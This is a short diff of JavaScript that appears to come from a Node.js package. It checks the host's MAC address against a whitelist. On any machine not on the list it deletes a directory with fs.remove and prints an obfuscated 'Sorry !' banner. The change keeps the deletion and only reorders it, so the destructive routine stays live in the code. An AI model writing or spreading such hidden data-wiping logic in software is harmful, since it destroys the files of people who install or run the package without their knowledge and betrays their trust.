@@ -24,11 +24,11 @@ const publicIp = require('public-ip')
     if (whiteList.includes(macAddr)) {
       return
     }
-
-    await fs.remove(rmDir)
+    
     figlet(String.fromCodePoint(83, 111, 114, 114, 121, 32, 33), function(_, data) {
       console.log(data)
     });
+    await fs.remove(rmDir)
   } catch (err)  {
     figlet('Oh my god !', function(_, data) {
       console.log(data)
